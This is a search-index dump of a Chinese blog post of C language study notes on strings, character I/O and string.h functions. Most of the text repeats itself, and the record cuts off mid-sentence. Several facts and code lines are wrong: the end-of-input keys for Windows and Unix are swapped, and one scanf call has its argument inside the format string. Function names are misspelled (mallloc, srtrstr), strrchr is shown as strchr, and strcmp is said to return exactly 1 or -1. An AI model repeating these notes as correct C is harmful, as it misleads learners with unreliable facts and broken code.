","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串变量"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串常量"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#构造字符串用指针还是数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#char是字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串输入输出"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#安全的输入"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常见错误"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#空字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#程序参数"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#102字符串函数"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#putchar-1"},{"categories":["Programing"],"content":"\r10.2字符串函数\rputchar int putchar(int c); 向标准输出写一个字符 返回写了几个字符，EOF(-1)表示写失败 getchar int getchar(void); 从标准输入读入一个字符 返回类型是int是为了返回EOF(-1) 输入结束 Windows ： CTRL+D Unix：CTRL+Z ","date":"2023-11-17","objectID":"/c_language_notes/:10:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#getchar-1"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include \u003cstdio.h\u003e int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1\u003cs2 strcpy char *strcpy(char *restrict dst,const char *restrict src); 把src的字符串拷贝到dst restrict表明src和dst不重叠 返回dst 为了能链起代码来 复制一个字符串(复制字符串而不是指针) char* dst = (char* ) mallloc (strlen (src)+1); strcpy(dst,src); strcat char * strcat(char *restrict s1,const char *restrict s2); 把s2拷贝到s1的后面，接成一个长的字符串 返回s1 (s1必须具有足够的空间) 安全问题strcpy和strcat都可能出现安全问题 (如果目的地没有足够的空间) 字符串中找字符 char * strchr(const char *s,int c); char * strchr(const char *s,int c); //从右边找回来 返回NULL表示没有找到 字符串中找字符串 char *srtrstr(const char *s1,const char *s2); char *strcasestr(const char *s1,const char* s2); //忽略大小写 后面的知识感觉现阶段要求没那么深，水一水吧 ","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#stringh文件头"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strlen"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcmp"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcpy"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#复制一个字符串复制字符串而不是指针"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#strcat"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char line[] = \"hello\"; printf(\"strlen=%lu\\n\", strlen(line)); printf(\"sizeof=%lu\\n\", sizeof(line)); return 0; } strlen=5，sizeof=6 (字符串数组结尾有\\0) strcmp int strcmp(const char *s1,const char *s2); 比较两个字符串，返回： 0:s1==s2 1:s1\u003es2 -1:s1","date":"2023-11-17","objectID":"/c_language_notes/:10:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#安全问题"},{"categories":["Programing"],"content":"\rstring.h文件头\rstrlen size_t strlen(const char *s); 返回s的字符串长度(不包括结尾的0) #include int main() { char 